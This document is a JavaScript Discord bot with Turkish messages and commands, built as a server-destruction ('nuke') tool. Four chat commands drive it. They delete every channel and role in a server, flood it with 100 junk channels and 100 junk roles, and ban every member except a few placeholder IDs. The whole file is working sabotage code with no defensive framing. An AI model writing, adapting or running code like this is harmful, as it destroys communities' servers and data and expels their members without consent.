const { Client, GatewayIntentBits, Partials, Collection } = require("discord.js");
const chalk = require("chalk");
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.GuildPresences,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.MessageContent, 
        GatewayIntentBits.DirectMessageReactions,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessageReactions,
        GatewayIntentBits.GuildWebhooks,
        GatewayIntentBits.GuildVoiceStates,
        GatewayIntentBits.GuildInvites,
    ],
    partials: [Partials.Channel]
});

client.on("ready", () => {
    console.log("Bot is ready!");
});

client.on("messageCreate", async (message) => {
    if (message.author.bot) return;
    if (message.content === "!sunucupatlat") {
       try {
        await message.guild.channels.cache.forEach((channel) => channel.delete()).catch((err) => {
            console.log(chalk.red(`[SİSTEM] `) + chalk.yellow(`${err}`));
        });
       } catch (error) {
              console.log(error);
         }

let adlar = ["İSİM1", "İSİM2", "İSİM3", "İSİM4", "İSİM5", "İSİM6", "İSİM7", "İSİM8", "İSİM9", "İSİM10"];

try {
    console.log(chalk.green(`[SİSTEM] `) + chalk.yellow(`Kanallar oluşturulmaya başlandı!`));
    for (let i = 0; i < 100; i++) {
        message.guild.channels.create({
            name: adlar[Math.floor(Math.random() * adlar.length)],
            type: 0  
        }).catch((err) => {
            console.log(chalk.red(`[SİSTEM] `) + chalk.yellow(`${err}`));
        });
    }
} catch (error) {
    console.log(error);
    }

try {
    console.log(chalk.green(`[SİSTEM] `) + chalk.yellow(`Roller oluşturulmaya başlandı!`));
    for (let i = 0; i < 100; i++) {
        message.guild.roles.create({
            name: adlar[Math.floor(Math.random() * adlar.length)]
        }).catch((err) => {
            console.log(chalk.red(`[SİSTEM] `) + chalk.yellow(`${err}`));
        });
    }
} catch (error) {
    console.log(error);
    }
    } 

    if (message.content === "!herkesiçıkart") {
        try {
            message.guild.members.cache.forEach(async (member) => {
                try {
                    if("ID" == member.id || "ID" == member.id || client.user.id == member.id) return;
                    await member.ban();
                    console.log(chalk.green(`[SİSTEM] `) + chalk.yellow(`${member.user.tag} adlı kullanıcı sunucudan yasaklandı!`));
                } catch (error) {
                    console.log(chalk.red(`[SİSTEM] `) + chalk.yellow(`${member.user.tag} adlı kullanıcıyı sunucudan atarken bir hata oluştu!`));
                }
            });
        } catch (error) {
            console.log(error);
        }
    }

    if (message.content === "!kanalpatlat") {
        try {
            message.guild.channels.cache.forEach(async (channel) => {
                try {
                    await channel.delete();
                    console.log(chalk.green(`[SİSTEM] `) + chalk.yellow(`${channel.name} adlı kanal silindi!`));
                } catch (error) {
                    console.log(chalk.red(`[SİSTEM] `) + chalk.yellow(`${channel.name} adlı kanalı silerken bir hata oluştu!`));
                }
            });
        } catch (error) {
            console.log(error);
        }
    }

    if (message.content === "!rolpatlat") {
        try {
            message.guild.roles.cache.forEach(async (role) => {
                try {
                    await role.delete();
                    console.log(chalk.green(`[SİSTEM] `) + chalk.yellow(`${role.name} adlı rol silindi!`));
                } catch (error) {
                    console.log(chalk.red(`[SİSTEM] `) + chalk.yellow(`${role.name} adlı rolü silerken bir hata oluştu!`));
                }
            });
        } catch (error) {
            console.log(error);
        }
    }
});


client.login("TOKEN").then(async() => {
    console.log(chalk.green(`[BOT] `) + chalk.yellow(`Bot başarıyla giriş yaptı!`));
  }).catch((err) => {
    console.log(chalk.red(`[BOT] `) + chalk.yellow(`Bot giriş yaparken bir hata oluştu! Hata: ${err}`));
  })